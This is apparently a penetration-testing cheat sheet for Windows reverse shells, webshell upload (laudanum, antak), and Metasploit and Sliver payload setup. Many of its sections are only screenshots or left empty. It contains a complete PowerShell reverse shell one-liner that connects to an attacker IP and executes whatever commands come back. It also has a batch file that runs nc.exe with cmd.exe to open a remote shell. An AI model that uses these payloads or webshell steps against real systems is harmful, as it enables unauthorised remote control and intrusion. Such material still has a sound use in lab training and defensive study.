
# Windows reverse shells
## Basic powershell reverse shell

```
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.98',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
## reverse shell dll

```


```
## reverse shell .bat
```
@echo off
set ATTACKER_IP=10.10.14.98
set PORT=1234

nc.exe %ATTACKER_IP% %PORT% -e cmd.exe
```
## Nishang


## Webshells

### laudanum
Find the type of shell needed, make copy


![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/bc795f21-8190-4590-a4a3-2fb35488a5fa)
![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/54a0b631-94a3-4ce9-a001-6e5c213c3a7b)


Add our IP


![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/a8ee9650-7b22-4c93-9136-a06e2fe8129a)

Upload file to site, go to location of file.


![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/d49eabfc-1581-497d-bc91-b7346bb9d019)

### antak

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/7d56c6d0-80cf-4e78-92c7-b43b8326ebf2)

change login info

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/0393c2f3-08b3-4015-a1ce-699bbed4e6b2)

Upload go to shell page

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/f5158b1f-e185-4343-9278-23ea1ece5ecc)# Payloads


![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/49b877f9-8979-4760-9b1f-038c410c9e7f)


## Shells with Metasploit

### Staged vs non staged
```
In Metasploit, the “/” character is used to denote whether a payload is staged or not,
so shell_reverse_tcp at index 20 is not staged, whereas shell/reverse_tcp at index 15 is.
```

### msfvenom

![Pasted image 20230508141045](https://github.com/dbissell6/Shadow_Stone/assets/50979196/988055f3-d9a3-4b0a-9e5b-be91b0886c30)

### msfconsole

g will set variable as global, useful when trying different exploits
`setg rhosts 10.10.10.10`


![Pasted image 20230508141206](https://github.com/dbissell6/Shadow_Stone/assets/50979196/efbcf2e5-fec1-4485-ba20-5e988702c92b)


`set payload windows/meterpreter/reverse_tcp`


### show system arch vs payload arch

![Pasted image 20230508154055](https://github.com/dbissell6/Shadow_Stone/assets/50979196/31f9ac3d-5efb-4b31-9237-f0b652376925)

Now can
```
set payload windows/x64/meterpreter/reverse_tcp
```
## Sliver

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/47d173f7-f725-4f09-a7d5-407fd6d67398)

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/61c75ccc-9ad2-4aaa-a186-458ebf22ddff)

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/5844f8d6-9654-4bbf-9079-357bb7c5161e)

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/66e93bb6-8523-46fb-9753-ae8fcbda44ee)
